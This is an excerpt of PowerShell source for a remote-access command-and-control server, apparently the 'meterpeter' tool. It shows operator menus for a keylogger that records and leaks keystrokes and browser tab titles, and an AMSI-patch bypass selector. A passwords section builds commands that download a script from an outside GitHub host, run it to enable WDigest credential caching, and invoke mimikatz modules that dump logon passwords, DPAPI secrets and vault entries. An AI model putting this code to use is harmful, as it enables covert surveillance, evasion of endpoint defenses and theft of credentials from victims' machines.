...
While($Client.Connected)
{
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "keylogger")
    {
        ...
        write-host "   Stop      Stop\leak keylogger keystrokes  Stop record and leak keyStrokes";
        write-host "   Browser   Capture browsers tab title      Start\Stop\Leak browsers tab title"
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
    ...
    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ...
      If($choise -ieq "AMSIpatch")
      {
        ...
        If($Patch_choise -ieq "Console")
        {
           ...
           write-host "  4        HernanRodriguezPatch`n"

           write-host " - Bypass technic to use (2|4): " -NoNewline;
           $Technic = Read-Host;
...
"@;Write-Host $AnwsomeBanner
      ...
      If($choise -ieq "Passwords" -or $choise -ieq "pass")
      {
        ...
        write-host "   Manycats  Invoke m[i]mika[t]z modules    Administrator";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Pass> " -NoNewline -ForeGroundColor Green;
        $pass_choise = Read-Host;
        If($pass_choise -ieq "WDigest")
        {
           write-host " * WDigest Credential caching [Memory]." -ForegroundColor Green
           write-host "   => wait for module to finish working." -ForegroundColor DarkYellow
           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1`" -OutFile `"`$Env:TMP\Invoke-WDigest.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-WDigest.ps1`" -wdigest 'true' -manycats;Remove-Item -Path `"`$Env:TMP\Invoke-WDigest.ps1`" -Force";
        }
        If($pass_choise -ieq "Manycats")
        {
           write-host " * Invoke m[i]mika[t]z multiple modules" -ForegroundColor Green
           write-host "   => wait for module to finish working." -ForegroundColor DarkYellow
           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1`" -OutFile `"`$Env:TMP\Invoke-WDigest.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-WDigest.ps1`" -wdigest 'false' -manycats -module 'net::group sekurlsa::wdigest sekurlsa::dpapi dpapi::cache sekurlsa::logonpasswords vault::list exit';Remove-Item -Path `"`$Env:TMP\Invoke-WDigest.ps1`" -Force";
        }
